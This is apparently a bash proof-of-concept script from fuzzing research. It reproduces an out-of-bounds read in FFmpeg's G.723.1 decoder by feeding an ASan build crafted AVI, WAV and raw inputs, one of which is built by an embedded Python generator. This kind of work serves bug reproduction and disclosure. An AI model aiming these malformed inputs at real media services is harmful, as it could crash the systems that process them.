#!/bin/bash
# PoC runner for VULN 001: OOB Read / NULL Pointer Dereference in g723_1_decode_frame()
# File: libavcodec/g723_1dec.c, line 933

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
RESULT=vuln_001_result.txt

: > "$RESULT"

echo "=== VULN 001 PoC: g723_1_decode_frame() OOB Read ===" | tee -a "$RESULT"
echo "Bug: buf[0] accessed at line 933 before size check at line 943" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Generate input files
echo "[*] Generating input files..." | tee -a "$RESULT"
python3 vuln_001_gen.py 2>&1 | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# --- Approach 1: AVI with zero-size G.723.1 audio chunk ---
echo "=== Approach 1: AVI file with zero-size G.723.1 audio chunk ===" | tee -a "$RESULT"
echo "[*] Running: $BIN -i vuln_001_input.avi -f null -" | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001a.log" \
  "$BIN" -i vuln_001_input.avi -f null - >> "$RESULT" 2>&1 || echo "[!] ffmpeg exited with error (expected)" | tee -a "$RESULT"
if ls asan_001a.log.* 2>/dev/null | head -1 | xargs -r cat >> "$RESULT" 2>/dev/null; then
    echo "[*] ASAN log captured for approach 1" | tee -a "$RESULT"
fi
echo "" | tee -a "$RESULT"

# --- Approach 2: raw g723_1 file (1 byte, dec_mode=3) ---
echo "=== Approach 2: raw g723_1 file (1 byte, dec_mode=3, frame_size=1) ===" | tee -a "$RESULT"
echo "[*] Running: $BIN -f g723_1 -i vuln_001_input.g723_1 -f null -" | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001b.log" \
  "$BIN" -f g723_1 -i vuln_001_input.g723_1 -f null - >> "$RESULT" 2>&1 || echo "[!] ffmpeg exited with error (expected)" | tee -a "$RESULT"
if ls asan_001b.log.* 2>/dev/null | head -1 | xargs -r cat >> "$RESULT" 2>/dev/null; then
    echo "[*] ASAN log captured for approach 2" | tee -a "$RESULT"
fi
echo "" | tee -a "$RESULT"

# --- Approach 3: WAV with zero-size data chunk ---
echo "=== Approach 3: WAV file with zero-size G.723.1 data chunk ===" | tee -a "$RESULT"
echo "[*] Running: $BIN -i vuln_001_input.wav -f null -" | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001c.log" \
  "$BIN" -i vuln_001_input.wav -f null - >> "$RESULT" 2>&1 || echo "[!] ffmpeg exited with error (expected)" | tee -a "$RESULT"
if ls asan_001c.log.* 2>/dev/null | head -1 | xargs -r cat >> "$RESULT" 2>/dev/null; then
    echo "[*] ASAN log captured for approach 3" | tee -a "$RESULT"
fi
echo "" | tee -a "$RESULT"

# --- Approach 4: Force-feed zero-size packet via piped null data ---
echo "=== Approach 4: raw g723_1 with 0-byte file ===" | tee -a "$RESULT"
echo "[*] Creating 0-byte g723_1 input and running..." | tee -a "$RESULT"
python3 -c "open('vuln_001_input_empty.g723_1','wb').close()"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001d.log" \
  "$BIN" -f g723_1 -i vuln_001_input_empty.g723_1 -f null - >> "$RESULT" 2>&1 || echo "[!] ffmpeg exited with error (expected)" | tee -a "$RESULT"
if ls asan_001d.log.* 2>/dev/null | head -1 | xargs -r cat >> "$RESULT" 2>/dev/null; then
    echo "[*] ASAN log captured for approach 4" | tee -a "$RESULT"
fi
echo "" | tee -a "$RESULT"

# --- Approach 5: AVI with a 3-byte G.723.1 chunk (dec_mode=0 -> needs 24 bytes, only 3 present) ---
echo "=== Approach 5: AVI file with too-small G.723.1 audio chunk (3 bytes, dec_mode=0) ===" | tee -a "$RESULT"
python3 - << 'PYEOF'
import struct, os

def riff_chunk(fourcc, data):
    size = len(data)
    chunk = fourcc.encode('ascii') + struct.pack('<I', size) + data
    if size % 2:
        chunk += b'\x00'
    return chunk

# strh for audio
strh = b'auds' + b'\x00\x00\x00\x00'
strh += struct.pack('<I', 0)   # dwFlags
strh += struct.pack('<H', 0)   # wPriority
strh += struct.pack('<H', 0)   # wLanguage
strh += struct.pack('<I', 0)   # dwInitialFrames
strh += struct.pack('<I', 1)   # dwScale
strh += struct.pack('<I', 8000)  # dwRate
strh += struct.pack('<I', 0)   # dwStart
strh += struct.pack('<I', 1)   # dwLength
strh += struct.pack('<I', 0)   # dwSuggestedBufferSize
strh += struct.pack('<I', 0xFFFFFFFF)  # dwQuality
strh += struct.pack('<I', 0)   # dwSampleSize
strh += struct.pack('<HHHH', 0, 0, 0, 0)  # rcFrame

# strf: WAVEFORMATEX for G.723.1
strf  = struct.pack('<H', 0x0042)  # wFormatTag
strf += struct.pack('<H', 1)       # nChannels
strf += struct.pack('<I', 8000)    # nSamplesPerSec
strf += struct.pack('<I', 800)     # nAvgBytesPerSec
strf += struct.pack('<H', 24)      # nBlockAlign
strf += struct.pack('<H', 0)       # wBitsPerSample
strf += struct.pack('<H', 0)       # cbSize

strh_c = riff_chunk('strh', strh)
strf_c = riff_chunk('strf', strf)

strl_inner = b'strl' + strh_c + strf_c
strl = b'LIST' + struct.pack('<I', len(strl_inner)) + strl_inner

avih  = struct.pack('<I', 125000)  # dwMicroSecPerFrame
avih += struct.pack('<I', 0)       # dwMaxBytesPerSec
avih += struct.pack('<I', 0)       # dwPaddingGranularity
avih += struct.pack('<I', 0)       # dwFlags
avih += struct.pack('<I', 1)       # dwTotalFrames
avih += struct.pack('<I', 0)       # dwInitialFrames
avih += struct.pack('<I', 1)       # dwStreams
avih += struct.pack('<I', 0)       # dwSuggestedBufferSize
avih += struct.pack('<I', 0)       # dwWidth
avih += struct.pack('<I', 0)       # dwHeight
avih += struct.pack('<IIII', 0, 0, 0, 0)

avih_c = riff_chunk('avih', avih)
hdrl_inner = b'hdrl' + avih_c + strl
hdrl = b'LIST' + struct.pack('<I', len(hdrl_inner)) + hdrl_inner

# movi with 3 bytes of audio data (dec_mode=0 -> frame_size=24, only 3 bytes -> size check warning)
audio_data = b'\x00\x00\x00'  # 3 bytes, buf[0]=0 -> dec_mode=0
audio_chunk = b'00wb' + struct.pack('<I', len(audio_data)) + audio_data

movi_inner = b'movi' + audio_chunk
movi = b'LIST' + struct.pack('<I', len(movi_inner)) + movi_inner

inner = hdrl + movi
avi = b'RIFF' + struct.pack('<I', len(inner) + 4) + b'AVI ' + inner

path = os.path.join(os.path.dirname(os.path.abspath('.')),
                    os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else '.',
                    'vuln_001_input_short.avi')
# Write to current dir
with open('vuln_001_input_short.avi', 'wb') as f:
    f.write(avi)
print(f"Created vuln_001_input_short.avi ({len(avi)} bytes)")
PYEOF

echo "[*] Running: $BIN -i vuln_001_input_short.avi -f null -" | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001e.log" \
  "$BIN" -i vuln_001_input_short.avi -f null - >> "$RESULT" 2>&1 || echo "[!] ffmpeg exited with error (expected)" | tee -a "$RESULT"
if ls asan_001e.log.* 2>/dev/null | head -1 | xargs -r cat >> "$RESULT" 2>/dev/null; then
    echo "[*] ASAN log captured for approach 5" | tee -a "$RESULT"
fi
echo "" | tee -a "$RESULT"

echo "=== PoC execution complete ===" | tee -a "$RESULT"
